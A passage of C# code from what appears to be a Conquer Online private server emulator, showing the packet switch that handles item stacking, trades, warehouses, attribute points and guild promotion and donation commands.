                                        ConquerItem mainItem = null;
                                        ConquerItem minorItem = new ConquerItem(true);
                                        Database.ConquerItemInformation infos = null;
                                        minorItem.Color = (MTA.Game.Enums.Color)Kernel.Random.Next(4, 8);
                                        if (client.Inventory.TryGetItem(usage.UID, out mainItem) && client.Inventory.TryGetItem(usage.dwParam, out minorItem))
                                        {
                                            if (mainItem.ID == minorItem.ID)
                                            {
                                                infos = new MTA.Database.ConquerItemInformation(mainItem.ID, 0);
                                                if (mainItem.StackSize < 1)
                                                    mainItem.StackSize = 1;
                                                if (minorItem.StackSize < 1)
                                                    minorItem.StackSize = 1;

                                                if ((mainItem.StackSize + minorItem.StackSize) <= infos.BaseInformation.StackSize)
                                                {
                                                    mainItem.StackSize += minorItem.StackSize;
                                                    mainItem.Mode = Game.Enums.ItemMode.Update;
                                                    mainItem.Send(client);
                                                    mainItem.Mode = Game.Enums.ItemMode.Default;
                                                    Database.ConquerItemTable.UpdateStack(mainItem);

                                                    client.Inventory.Remove(minorItem, Game.Enums.ItemUse.Remove);
                                                }
                                            }
                                        }
                                        break;
                                    }
                                case 34:
                                    {
                                        break;
                                    }
                                case ItemUsage.LowerEquipment:
                                    {
                                        ConquerItem item = null;
                                        if (client.Inventory.TryGetItem(usage.UID, out item))
                                        {
                                            if (IsFranko(item.ID)) return;
                                            ConquerItem upgrade = null;
                                            if (client.Inventory.TryGetItem(usage.UID, out upgrade))
                                            {
                                                if (client.Entity.ConquerPoints < 54)
                                                {
                                                    client.Send(new Message("You don't have 54CPs.", Color.Red, Message.TopLeft));
                                                    return;
                                                }
                                                client.Entity.ConquerPoints -= 54;
                                                Database.ConquerItemInformation infos = new MTA.Database.ConquerItemInformation(item.ID, item.Plus);
                                                if (infos.BaseInformation.Level <= 15) return;
                                                int startwith = (int)(infos.BaseInformation.ID / 1000);
                                                int endwith = (int)(infos.BaseInformation.ID % 10);
                                                //var sitem = infos.LowestID(ItemMinLevel(ItemPosition(infos.BaseInformation.ID)));
                                                var sitem = MTA.Database.ConquerItemInformation.BaseInformations.Values.Where(x => (x.ID % 10) == endwith && (x.ID / 1000) == startwith && x.Level >= 15).OrderBy(y => y.Level).First();
                                                item.ID = sitem.ID;
                                                infos = new MTA.Database.ConquerItemInformation(item.ID, item.Plus);
                                                item.Durability = item.MaximDurability = infos.BaseInformation.Durability;
                                                Database.ConquerItemTable.UpdateItemID(item, client);
                                                Database.ConquerItemTable.UpdateDurabilityItem(item);
                                                item.Mode = MTA.Game.Enums.ItemMode.Update;
                                                item.Send(client);
                                                item = ItemSocket(item, 2);
                                            }
                                        }
                                        break;
                                    }
                                default:
                                    {
                                        //nta mot2ked enk 3amel update lel client m4 3arf :D

                                        Console.WriteLine("Unhandled item usage type : " + usage.ID);
                                        break;
                                    }
                            }
                        }
                        break;
                    }
                #endregion
                #region String (1015)
                /*case 1015:
                    {

                        if (client.Action != 2)
                            return;
                        _String stringpacket = new _String(false);
                        stringpacket.Deserialize(packet);
                        switch (stringpacket.Type)
                        {
                            case _String.ViewEquipSpouse:
                                {
                                    var target = Program.Values.Where(p => p.Entity.UID == stringpacket.UID).First();
                                    if (target == null)
                                        return;

                                    stringpacket.Texts.Add(target.Entity.Spouse);
                                    stringpacket.TextsCount = 1;
                                    stringpacket.Type = _String.ViewEquipSpouse;
                                    client.Send(stringpacket);
                                    break;

                                }
                            case _String.WhisperDetails:
                                {
                                    if (stringpacket.Texts.Count > 0)
                                    {
                                        foreach (var pClient in Program.Values)
                                        {
                                            if (pClient.Entity.Name == stringpacket.Texts[0])
                                            {
                                                var guild = "";
                                                if (pClient.Guild != null && pClient.Entity.GuildID != 0)
                                                    guild = pClient.Guild.Name;
                                                var info = string.Format("{0} {1} {2} #{3} #{4} {5} {6} {7:d}",
                                   pClient.Entity.UID, pClient.Entity.Level, pClient.Entity.BattlePower, guild, "", pClient.Entity.Spouse, pClient.Entity.NobilityRank, pClient.Entity.Body);
                                                stringpacket.Texts.Add(info);
                                                stringpacket.TextsCount = 1;
                                                stringpacket.Type = _String.WhisperDetails;
                                                client.Send(stringpacket);
                                            }
                                            #region old
                                            //if (pClient != null)
                                            //{
                                            //    if (pClient.Entity != null)
                                            //    {
                                            //        if (pClient.Entity.Name == stringpacket.Texts[0])
                                            //        {
                                            //            string otherstring = "";
                                            //            otherstring += pClient.Entity.UID + " ";
                                            //            otherstring += pClient.Entity.Level + " ";
                                            //            otherstring += pClient.Entity.BattlePower + " #";
                                            //            if (pClient.Guild != null)
                                            //            {
                                            //                if (pClient.Entity.GuildID != 0)
                                            //                    otherstring += pClient.Guild.Name + " fNone#";
                                            //            }
                                            //            else
                                            //                otherstring += "None fNone# ";
                                            //            otherstring += pClient.Entity.Spouse + " ";
                                            //            otherstring += (byte)(pClient.Entity.NobilityRank) + " ";
                                            //            if (pClient.Entity.Body % 10 < 3) otherstring += "1";
                                            //            else otherstring += "0";
                                            //            stringpacket.Texts.Add(otherstring);
                                            //            stringpacket.TextsCount = 1;
                                            //            stringpacket.Type = 26;
                                            //            client.Send(stringpacket);
                                            //        }
                                            //    }
                                            //}
                                            #endregion 
                                        }
                                    }
                                    break;
                                }
                        }
                        break;
                    }*/
                case 1015:
                    {
                        _String._Strings(packet, client);
                        break;
                    }
                #endregion
                #region KnownPersons (1019)
                case 1019:
                    {
                        KnownPersons knownP = new KnownPersons(false);
                        knownP.Deserialize(packet);
                        switch (knownP.Type)
                        {
                            case KnownPersons.RequestFriendship:
                                {
                                    AddFriend(knownP, client);
                                    break;
                                }
                            case KnownPersons.RemovePerson:
                                {
                                    RemoveFriend(knownP, client);
                                    break;
                                }
                            case KnownPersons.RemoveEnemy:
                                {
                                    RemoveEnemy(knownP, client);
                                    break;
                                }
                            case KnownPersons.AcceptFriend:
                                {
                                    AcceptFriend(knownP, client);
                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                #region Attack (1022)
                case 1022:
                    {
                        if (client.Action != 2) return;
                        client.LastAttack = Time32.Now;
                        GamePackets.Attack attack = new Attack(false);
                        attack.Deserialize(packet);
                        Writer.WriteUInt32(0, 8, attack.ToArray());
                        switch (attack.AttackType)
                        {
                            case 36:
                                GamePackets.Attack attack2 = new Attack(true);
                                attack2 = attack;
                                //   attack2.KOCount = (ushort)((attack.Damage << 16) | 1);
                                attack2.ResponseDamage = client.Entity.QuestKO;
                                client.Send(attack2);
                                break;
                            default:
                                Attack(attack, client);
                                break;
                        }
                        if (client.Entity.ContainsFlag(Update.Flags.Intensify))
                        {
                            client.Entity.RemoveFlag(Update.Flags.Intensify);
                            client.Entity.IntensifyPercent = 0;
                        }
                        break;
                    }
                #endregion
                #region Teams (1023)
                case 1023:
                    {
                        Team.Process(packet, client);
                        break;
                    }
                #endregion
                #region Atributes Set (1024)
                case 1024:
                    {
                        if (client.Action != 2)
                            return;
                        uint AddStr = BitConverter.ToUInt32(packet, 12);
                        uint AddAgi = BitConverter.ToUInt32(packet, 16);
                        uint AddVit = BitConverter.ToUInt32(packet, 20);
                        uint AddSpi = BitConverter.ToUInt32(packet, 24);
                        if (client.Entity.Atributes == 0)
                            return;

                        uint TotalStatPoints = AddStr + AddAgi + AddVit + AddSpi;

                        if (client.Entity.Atributes >= TotalStatPoints)
                        {
                            client.Entity.Strength += (ushort)AddStr;
                            client.Entity.Agility += (ushort)AddAgi;
                            client.Entity.Vitality += (ushort)AddVit;
                            client.Entity.Spirit += (ushort)AddSpi;
                            client.Entity.Atributes -= (ushort)TotalStatPoints;
                            client.Send(packet);
                        }
                        client.CalculateStatBonus();
                        client.CalculateHPBonus();
                        client.GemAlgorithm();
                        break;
                    }
                #endregion
                #region Socketing (1027)
                case 1027:
                    {
                        EmbedSocket socket = new EmbedSocket(false);
                        socket.Deserialize(packet);
                        SocketItem(socket, client);
                        break;
                    }
                #endregion
                #region Character Statistics (1040)
                case 1040:
                    {
                        uint UID = BitConverter.ToUInt32(packet, 8);
                        Client.GameState Client;
                        if (Kernel.GamePool.TryGetValue(UID, out Client))
                        {
                            client.Send(WindowStats(Client));
                        }
                        break;
                    }
                #endregion
                #region LoginPacket (1052)
                case 1052:
                    {
                        if (client.Action == 1)
                        {
                            Connect connect = new Connect();
                            connect.Deserialize(packet);
                            AppendConnect(connect, client);
                        }
                        else
                            client.Disconnect();
                        break;
                    }
                #endregion
                #region Trade (1056)
                case 1056:
                    {
                        if (client.Action != 2)
                            return;
                        if (client.Entity.PokerTableUID > 0) return;
                        Trade trade = new Trade(false);
                        trade.Deserialize(packet);
                        Client.GameState _client = null;
                        if (Kernel.GamePool.TryGetValue(trade.dwParam, out _client))
                        {
                            if (client.Account.State == Database.AccountTable.AccountState.GM)
                            {
                                if (client.BlockTrade)
                                {
                                    client.MessageBox("You Activated Trade Block , Please Remove it.");
                                    return;
                                }
                            }
                            if (_client.Account.State == Database.AccountTable.AccountState.GM)
                            {
                                if (_client.BlockTrade)
                                {
                                    client.MessageBox("Trade Block , You Can't Trade With Him.");
                                    return;
                                }
                            }
                        }
                        lock (client.ItemSyncRoot)
                        {
                            switch (trade.Type)
                            {
                                case Trade.Request:
                                    RequestTrade(trade, client);
                                    break;
                                case Trade.Close:
                                    CloseTrade(trade, client);
                                    break;
                                case Trade.AddItem:
                                    AddTradeItem(trade, client);
                                    break;
                                case Trade.SetMoney:
                                    SetTradeMoney(trade, client);
                                    break;
                                case Trade.SetConquerPoints:
                                    SetTradeConquerPoints(trade, client);
                                    break;
                                case Trade.Accept:
                                    AcceptTrade(trade, client);
                                    break;
                            }
                        }
                        break;
                    }
                #endregion
                #region Floor items (1101)
                case 1101:
                    {
                        if (client.Action != 2)
                            return;
                        FloorItem floorItem = new FloorItem(false);
                        floorItem.Deserialize(packet);
                        PickupItem(floorItem, client);
                        break;
                    }
                #endregion
                #region Warehouses (1102)
                case 1102:
                    {
                        if (client.Action != 2)
                            return;
                        Warehouse warehousepacket = new Warehouse(false);
                        warehousepacket.Deserialize(packet);
                        if (MaTrix.House.SpouseWarehouse(client, warehousepacket))
                            return;
                        switch (warehousepacket.Type)
                        {
                            case Warehouse.Entire:
                                {
                                    if (!client.Warehouses.ContainsKey((MTA.Game.ConquerStructures.Warehouse.WarehouseID)client.Account.EntityID))
                                        client.Warehouses.Add((Game.ConquerStructures.Warehouse.WarehouseID)client.Account.EntityID, new Game.ConquerStructures.Warehouse(client, (Game.ConquerStructures.Warehouse.WarehouseID)client.Account.EntityID));

                                    Game.ConquerStructures.Warehouse wh = client.Warehouses[(MTA.Game.ConquerStructures.Warehouse.WarehouseID)warehousepacket.NpcID];
                                    if (wh == null) return;
                                    byte count = 0;
                                    warehousepacket.Count = 1;
                                    warehousepacket.Type = Warehouse.AddItem;
                                    for (; count < wh.Count; count++)
                                    {
                                        warehousepacket.Append(wh.Objects[count]);
                                        client.Send(warehousepacket);

                                        ItemAdding add = new ItemAdding(true);
                                        if (wh.Objects[count].Purification.Available)
                                            add.Append(wh.Objects[count].Purification);
                                        if (wh.Objects[count].ExtraEffect.Available)
                                            add.Append(wh.Objects[count].ExtraEffect);
                                        if (wh.Objects[count].Purification.Available || wh.Objects[count].ExtraEffect.Available)
                                            client.Send(add);

                                    }
                                    break;
                                }
                            case Warehouse.AddItem:
                                {
                                    if (client.Booth != null)
                                        return;
                                    //foreach (ConquerItem itemx in client.Inventory.Objects)
                                    //{
                                    //    if ((itemx.ID == 1100003) || (itemx.ID == 1100006) || (itemx.ID == 1100009))
                                    //    {
                                    //        if (!client.Warehouses.ContainsKey((MTA.Game.ConquerStructures.Warehouse.WarehouseID)(uint)itemx.UID))
                                    //        {
                                    //            client.Warehouses.Add((MTA.Game.ConquerStructures.Warehouse.WarehouseID)(uint)itemx.UID, new MTA.Game.ConquerStructures.Warehouse(client, (MTA.Game.ConquerStructures.Warehouse.WarehouseID)(uint)itemx.UID));
                                    //        }
                                    //    }
                                    //}
                                    Game.ConquerStructures.Warehouse wh = client.Warehouses[(MTA.Game.ConquerStructures.Warehouse.WarehouseID)warehousepacket.NpcID];
                                    if (wh == null) return;
                                    ConquerItem item = null;
                                    if (client.Inventory.TryGetItem(warehousepacket.UID, out item))
                                    {
                                        if (item.ID >= 729960 && item.ID <= 729970)
                                            return;
                                        if (item.ID == 729611 || item.ID == 729612 || item.ID == 729613 || item.ID == 729614 || item.ID == 729703)
                                            return;
                                        if (!ConquerItem.isRune(item.UID))
                                        {
                                            if (wh.Add(item))
                                            {
                                                warehousepacket.UID = 0;
                                                warehousepacket.Count = 1;
                                                warehousepacket.Append(item);
                                                client.Send(warehousepacket);

                                                ItemAdding add = new ItemAdding(true);
                                                if (item.Purification.Available)
                                                    add.Append(item.Purification);
                                                if (item.ExtraEffect.Available)
                                                    add.Append(item.ExtraEffect);
                                                if (item.Purification.Available || item.ExtraEffect.Available)
                                                    client.Send(add);

                                                return;
                                            }
                                        }
                                        else client.Send(new Message("You can not store Flame Stone Rune's in Warehouse", System.Drawing.Color.Red, Message.TopLeft));
                                    }
                                    break;
                                }
                            case Warehouse.RemoveItem:
                                {
                                    Game.ConquerStructures.Warehouse wh = client.Warehouses[(MTA.Game.ConquerStructures.Warehouse.WarehouseID)warehousepacket.NpcID];
                                    if (wh == null) return;
                                    if (wh.ContainsUID(warehousepacket.UID))
                                    {
                                        if (wh.Remove(warehousepacket.UID))
                                        {
                                            client.Send(warehousepacket);
                                            return;
                                        }
                                    }
                                    break;
                                }
                            default:
                                {
                                    Console.WriteLine("Unknown type: " + warehousepacket.Type);
                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                #region Guild Command (1107)
                case 1107:
                    {
                        GuildCommand command = new GuildCommand(false);
                        command.Deserialize(packet);
                        switch (command.Type)
                        {
                            case GuildCommand.PromoteInfo:
                                {
                                    if (client.AsMember.Rank == MTA.Game.Enums.GuildMemberRank.GuildLeader)
                                    {
                                        SafeDictionary<uint, Game.ConquerStructures.Society.Guild.Member> array2 = new SafeDictionary<uint, Game.ConquerStructures.Society.Guild.Member>();
                                        //  var array = client.Guild.Members.Values.Where(p => p.Rank == (Enums.GuildMemberRank)command.dwParam).ToArray();
                                        foreach (var p in client.Guild.Members.Values)
                                        {
                                            if (p.Rank == (Enums.GuildMemberRank)command.dwParam)
                                            {
                                                array2.Add(p.ID, p);
                                            }
                                        }
                                        var array = array2.Values.ToArray();
                                        if (array != null)
                                        {
                                            byte[] Buffer = new byte[8 + 48 + array.Length * 32];
                                            Writer.WriteUInt16((ushort)(Buffer.Length - 8), 0, Buffer);
                                            Writer.WriteUInt16(2102, 2, Buffer);
                                            Writer.Uint(1, 4, Buffer);
                                            Writer.Uint((uint)array.Length, 12, Buffer);
                                            int offset = 16;
                                            for (int i = 0; i < array.Length; i++)
                                            {
                                                Writer.Uint((uint)array[i].Level, offset, Buffer);//level
                                                offset += 4;
                                                Writer.Uint((uint)(array[i].IsOnline ? 1 : 0), offset, Buffer);//online
                                                offset += 4;
                                                if (array[i].IsOnline)
                                                    Writer.Uint((uint)array[i].Client.Entity.BattlePower, offset, Buffer);//bp  
                                                offset += 4;
                                                //  Writer.Uint((uint)Enums.GuildMemberRank.DeputyLeader, offset, Buffer);//unkown1
                                                offset += 4;
                                                Writer.String(array[i].Name, offset, Buffer);
                                                offset += 16;
                                            }
                                            client.Send(Buffer);
                                        }
                                    }
                                    client.Send(packet);
                                    break;
                                }
                            case GuildCommand.RequestPromote:
                                {
                                    if (client.Guild == null) break;
                                    if (client.AsMember == null) break;

                                    command.SendPromote(client, (ushort)GuildCommand.RequestPromote);
                                    break;
                                }
                            case GuildCommand.Info:
                                {
                                    var Guild = Kernel.Guilds[command.dwParam];
                                    if (Guild != null)
                                        Guild.SendName(client);
                                    break;
                                }
                            case GuildCommand.ChangeGuildRequirements:
                                {
                                    if (client.AsMember.Rank == MTA.Game.Enums.GuildMemberRank.GuildLeader)
                                    {
                                        client.Guild.LevelRequirement = Math.Min(command.dwParam2, 140);
                                        client.Guild.RebornRequirement = Math.Min(command.dwParam3, 2);
                                        client.Guild.ClassRequirement = Math.Min(command.dwParam4, 127);
                                        foreach (var member in client.Guild.Members.Values)
                                            if (member.IsOnline)
                                                client.Guild.SendGuild(member.Client);
                                        Database.GuildTable.SaveRequirements(client.Guild);
                                    }
                                    break;
                                }
                            case GuildCommand.Neutral1:
                            case GuildCommand.Neutral2:
                                {
                                    string name = System.Text.Encoding.Default.GetString(packet, 26, packet[25]);
                                    if (client.Guild != null)
                                    {
                                        if (client.AsMember.Rank == MTA.Game.Enums.GuildMemberRank.GuildLeader)
                                        {
                                            client.Guild.RemoveAlly(name);
                                            foreach (var guild in Kernel.Guilds.Values)
                                            {
                                                if (guild.Name == name && client.Guild.Name != name)
                                                {
                                                    guild.RemoveAlly(client.Guild.Name);
                                                }
                                            }
                                            client.Guild.RemoveEnemy(name);
                                        }
                                    }
                                    break;
                                }
                            case GuildCommand.Allied:
                                {
                                    string name = System.Text.Encoding.Default.GetString(packet, 26, packet[25]);
                                    if (client.Guild != null)
                                    {
                                        if (client.AsMember.Rank == MTA.Game.Enums.GuildMemberRank.GuildLeader)
                                        {
                                            if (client.Guild.Ally.Count < 15)
                                            {
                                                AllyGuilds(name, client);
                                            }
                                        }
                                    }
                                    break;
                                }
                            case GuildCommand.Enemied:
                                {
                                    string name = System.Text.Encoding.Default.GetString(packet, 26, packet[25]);
                                    if (client.Guild != null)
                                    {
                                        if (client.AsMember.Rank == MTA.Game.Enums.GuildMemberRank.GuildLeader)
                                        {
                                            if (client.Guild.Enemy.Count < 15)
                                            {
                                                client.Guild.AddEnemy(name);
                                            }
                                        }
                                    }
                                    break;
                                }
                            case 48://Deny
                                {
                                    if (client.Guild != null)
                                    {
                                        uint UID = command.dwParam;
                                        if (Kernel.GamePool.ContainsKey(UID))
                                        {
                                            var c = Kernel.GamePool[UID];
                                            if (!client.Guild.BlackList.Contains(UID))
                                                client.Guild.BlackList.Add(UID);
                                            c.Send(command);
                                        }
                                    }
                                    break;
                                }
                            case 50://remove from black list
                                {
                                    if (client.Guild != null)
                                    {
                                        uint UID = command.dwParam;
                                        if (client.Guild.BlackList.Contains(UID))
                                            client.Guild.BlackList.Remove(UID);
                                        client.Send(command);

                                    }
                                    break;
                                }
                            default:
                                {
                                    client.Send(packet);
                                    break;
                                }
                            case GuildCommand.Bulletin:
                                {
                                    string message = System.Text.Encoding.Default.GetString(packet, 26, packet[25]);
                                    if (client.Guild != null)
                                    {
                                        if (client.AsMember.Rank == MTA.Game.Enums.GuildMemberRank.GuildLeader)
                                        {
                                            client.Guild.Bulletin = message;
                                            client.Guild.CreateBuletinTime();
                                            client.Guild.SendGuild(client);
                                            Database.GuildTable.UpdateBulletin(client.Guild, client.Guild.Bulletin);
                                        }
                                    }
                                    break;
                                }
                            case GuildCommand.DonateSilvers:
                                {
                                    if (client.Guild != null)
                                    {
                                        if (client.Trade.InTrade)
                                            return;
                                        if (client.Entity.Money >= command.dwParam)
                                        {
                                            client.Guild.SilverFund += command.dwParam;
                                            Database.GuildTable.SaveFunds(client.Guild);
                                            client.AsMember.SilverDonation += command.dwParam;
                                            client.Entity.Money -= command.dwParam;
                                            client.Guild.SendGuild(client);
                                        }
                                    }
                                    break;
                                }
                            case GuildCommand.DonateConquerPoints:
                                {
                                    if (client.Guild != null)
                                    {
                                        if (client.Trade.InTrade)
                                            return;
                                        if (client.Entity.ConquerPoints >= command.dwParam)
                                        {
                                            client.Guild.ConquerPointFund += command.dwParam;
                                            Database.GuildTable.SaveFunds(client.Guild);
                                            client.AsMember.ConquerPointDonation += command.dwParam;
                                            client.Entity.ConquerPoints -= command.dwParam;
                                            client.Guild.SendGuild(client);
                                        }
                                    }
                                    break;
                                }
                            case GuildCommand.Refresh:
                                {
                                    if (client.AsMember != null)
                                    {
                                        if (client.Guild != null)
                                            client.Guild.SendGuild(client);
                                    }
                                    break;
                                }
                            case GuildCommand.Discharge:
                                {
                                    string name = System.Text.Encoding.Default.GetString(packet, 26, packet[25]);
                                    if (client.Guild != null)
                                    {
                                        if (client.AsMember.Rank == MTA.Game.Enums.GuildMemberRank.GuildLeader)
                                        {
                                            var member = client.Guild.GetMemberByName(name);
                                            if (member.ID != client.Entity.UID)
                                            {
                                                if (member.Rank == MTA.Game.Enums.GuildMemberRank.DeputyLeader)
                                                {
                                                    client.Guild.RanksCounts[(ushort)Game.Enums.GuildMemberRank.DeputyLeader]--;
                                                    member.Rank = MTA.Game.Enums.GuildMemberRank.Member;
                                                    if (member.IsOnline)
                                                    {
                                                        client.Guild.SendGuild(member.Client);
                                                        member.Client.Entity.GuildRank = (ushort)member.Rank;
                                                        member.Client.Screen.FullWipe();
                                                        member.Client.Screen.Reload(null);
                                                        member.Client.Entity.GuildBattlePower = member.Guild.GetSharedBattlepower(member.Rank);
                                                    }

                                                    Database.EntityTable.UpdateData(member.ID, "GuildRank", (int)member.Rank);
                                                }
                                            }
                                        }
                                    }
                                    break;
                                }
                            case GuildCommand.Promote:
                                {
                                    if (client.Guild != null && client.AsMember != null)
                                    {
                                        //if (client.Guild.Members.ContainsKey(command.dwParam))
                                        {

                                            string GetMemberName = ReadString(packet, 26, packet[25]);
                                            ushort GetMemberRank = BitConverter.ToUInt16(packet, 8);

                                            Game.ConquerStructures.Society.Guild.Member MemberPromote = null;
                                            if (client.Guild.GetMember(GetMemberName, out MemberPromote))
                                            {

                                                if (client.AsMember.Rank < MemberPromote.Rank)
                                                {
                                                    client.Entity.SendSysMesage("Sorry, you have small rank for change he position!");
                                                    break;
                                                }
                                                if (client.AsMember.Rank == Enums.GuildMemberRank.DeputyLeader)
                                                {
                                                    if (GetMemberRank == (ushort)Enums.GuildMemberRank.Steward)
                                                    {
                                                        if (client.Guild.RanksCounts[GetMemberRank] >= 3)
                                                        {
                                                            client.Entity.SendSysMesage("Sorry all Steward`s ranks its ocupated!");
                                                            return;

                                                        }
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]--;
                                                        MemberPromote.Rank = (Enums.GuildMemberRank)GetMemberRank;
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]++;
                                                        if (MemberPromote.IsOnline)
                                                        {
                                                            client.Guild.SendGuild(MemberPromote.Client);
                                                            MemberPromote.Client.Entity.GuildBattlePower = client.Guild.GetSharedBattlepower(MemberPromote.Rank);
                                                            MemberPromote.Client.Entity.GuildRank = (ushort)MemberPromote.Rank;
                                                            MemberPromote.Client.Screen.FullWipe();
                                                            MemberPromote.Client.Screen.Reload(null);
                                                        }
                                                    }
                                                    if (GetMemberRank == (ushort)Enums.GuildMemberRank.Follower)
                                                    {
                                                        if (client.Guild.RanksCounts[GetMemberRank] >= 10)
                                                        {
                                                            client.Entity.SendSysMesage("Sorry all Follower`s ranks its ocupated!");
                                                            return;

                                                        }
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]--;
                                                        MemberPromote.Rank = (Enums.GuildMemberRank)GetMemberRank;
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]++;
                                                        if (MemberPromote.IsOnline)
                                                        {
                                                            client.Guild.SendGuild(MemberPromote.Client);
                                                            MemberPromote.Client.Entity.GuildBattlePower = client.Guild.GetSharedBattlepower(MemberPromote.Rank);
                                                            MemberPromote.Client.Entity.GuildRank = (ushort)MemberPromote.Rank;
                                                            MemberPromote.Client.Screen.FullWipe();
                                                            MemberPromote.Client.Screen.Reload(null);
                                                        }
                                                    }
                                                    if (GetMemberRank == (ushort)Enums.GuildMemberRank.Aide)
                                                    {
                                                        if (client.Guild.RanksCounts[GetMemberRank] >= 6)
                                                        {
                                                            client.Entity.SendSysMesage("Sorry all Aide`s ranks its ocupated!");
                                                            return;

                                                        }
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]--;
                                                        MemberPromote.Rank = (Enums.GuildMemberRank)GetMemberRank;
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]++;
                                                        if (MemberPromote.IsOnline)
                                                        {
                                                            client.Guild.SendGuild(MemberPromote.Client);
                                                            MemberPromote.Client.Entity.GuildBattlePower = client.Guild.GetSharedBattlepower(MemberPromote.Rank);
                                                            MemberPromote.Client.Entity.GuildRank = (ushort)MemberPromote.Rank;
                                                            MemberPromote.Client.Screen.FullWipe();
                                                            MemberPromote.Client.Screen.Reload(null);
                                                        }
                                                    }


                                                }
                                                if (client.AsMember.Rank == Enums.GuildMemberRank.Manager || client.AsMember.Rank == Enums.GuildMemberRank.HonoraryManager)
                                                {
                                                    if (GetMemberRank == (ushort)Enums.GuildMemberRank.Aide)
                                                    {
                                                        if (client.Guild.RanksCounts[GetMemberRank] >= 6)
                                                        {
                                                            client.Entity.SendSysMesage("Sorry all Aide`s ranks its ocupated!");
                                                            return;

                                                        }
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]--;
                                                        MemberPromote.Rank = (Enums.GuildMemberRank)GetMemberRank;
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]++;
                                                        if (MemberPromote.IsOnline)
                                                        {
                                                            client.Guild.SendGuild(MemberPromote.Client);
                                                            MemberPromote.Client.Entity.GuildBattlePower = client.Guild.GetSharedBattlepower(MemberPromote.Rank);
                                                            MemberPromote.Client.Entity.GuildRank = (ushort)MemberPromote.Rank;
                                                            MemberPromote.Client.Screen.FullWipe();
                                                            MemberPromote.Client.Screen.Reload(null);
                                                        }
                                                    }
                                                }
                                                if (client.AsMember.Rank == Enums.GuildMemberRank.GuildLeader || client.AsMember.Rank == Enums.GuildMemberRank.LeaderSpouse)
                                                {
                                                    if (GetMemberRank == (ushort)Enums.GuildMemberRank.GuildLeader)
                                                    {
                                                        if (client.AsMember.Rank == Enums.GuildMemberRank.LeaderSpouse)
                                                            return;
                                                        MemberPromote.Rank = MTA.Game.Enums.GuildMemberRank.GuildLeader;

                                                        client.Guild.LeaderName = MemberPromote.Name;
                                                        if (MemberPromote.IsOnline)
                                                        {
                                                            client.Guild.SendGuild(MemberPromote.Client);
                                                            MemberPromote.Client.Entity.GuildBattlePower = client.Guild.GetSharedBattlepower(MemberPromote.Rank);
                                                            MemberPromote.Client.Entity.GuildRank = (ushort)MemberPromote.Rank;
                                                            MemberPromote.Client.Screen.FullWipe();
                                                            MemberPromote.Client.Screen.Reload(null);
                                                        }
                                                        client.AsMember.Rank = MTA.Game.Enums.GuildMemberRank.DeputyLeader;

                                                        client.Entity.GuildRank = (ushort)client.AsMember.Rank;

                                                        client.Guild.SendGuild(client);
                                                        client.Screen.FullWipe();
                                                        client.Screen.Reload(null);
                                                        Database.GuildTable.SaveLeader(client.Guild);
                                                    }
                                                    if (GetMemberRank == (ushort)Enums.GuildMemberRank.DeputyLeader)
                                                    {

                                                        if (client.Guild.RanksCounts[GetMemberRank] >= 6)
                                                        {
                                                            client.Entity.SendSysMesage("Sorry all DeputyLeader`s ranks its ocupated!");
                                                            return;

                                                        }
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]--;
                                                        MemberPromote.Rank = (Enums.GuildMemberRank)GetMemberRank;
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]++;
                                                        if (MemberPromote.IsOnline)
                                                        {
                                                            client.Guild.SendGuild(MemberPromote.Client);
                                                            MemberPromote.Client.Entity.GuildBattlePower = client.Guild.GetSharedBattlepower(MemberPromote.Rank);
                                                            MemberPromote.Client.Entity.GuildRank = (ushort)MemberPromote.Rank;
                                                            MemberPromote.Client.Screen.FullWipe();
                                                            MemberPromote.Client.Screen.Reload(null);
                                                        }
                                                    }
                                                    if (GetMemberRank == (ushort)Enums.GuildMemberRank.Aide)
                                                    {
                                                        if (client.AsMember.Rank == Enums.GuildMemberRank.LeaderSpouse)
                                                            return;
                                                        if (client.Guild.RanksCounts[GetMemberRank] >= 6)
                                                        {
                                                            client.Entity.SendSysMesage("Sorry all Aide`s ranks its ocupated!");
                                                            return;

                                                        }
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]--;
                                                        MemberPromote.Rank = (Enums.GuildMemberRank)GetMemberRank;
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]++;
                                                        if (MemberPromote.IsOnline)
                                                        {
                                                            client.Guild.SendGuild(MemberPromote.Client);
                                                            MemberPromote.Client.Entity.GuildBattlePower = client.Guild.GetSharedBattlepower(MemberPromote.Rank);
                                                            MemberPromote.Client.Entity.GuildRank = (ushort)MemberPromote.Rank;
                                                            MemberPromote.Client.Screen.FullWipe();
                                                            MemberPromote.Client.Screen.Reload(null);
                                                        }
                                                    }
                                                    if (GetMemberRank == (ushort)Enums.GuildMemberRank.Steward)
                                                    {
                                                        if (client.Guild.RanksCounts[GetMemberRank] >= 3)
                                                        {
                                                            client.Entity.SendSysMesage("Sorry all Steward`s ranks its ocupated!");
                                                            return;

                                                        }
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]--;
                                                        MemberPromote.Rank = (Enums.GuildMemberRank)GetMemberRank;
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]++;
                                                        if (MemberPromote.IsOnline)
                                                        {
                                                            client.Guild.SendGuild(MemberPromote.Client);
                                                            MemberPromote.Client.Entity.GuildBattlePower = client.Guild.GetSharedBattlepower(MemberPromote.Rank);
                                                            MemberPromote.Client.Entity.GuildRank = (ushort)MemberPromote.Rank;
                                                            MemberPromote.Client.Screen.FullWipe();
                                                            MemberPromote.Client.Screen.Reload(null);
                                                        }
                                                    }
                                                    if (GetMemberRank == (ushort)Enums.GuildMemberRank.Follower)
                                                    {
                                                        if (client.Guild.RanksCounts[GetMemberRank] >= 10)
                                                        {
                                                            client.Entity.SendSysMesage("Sorry all Follower`s ranks its ocupated!");
                                                            return;

                                                        }
                                                        client.Guild.RanksCounts[(ushort)MemberPromote.Rank]--;
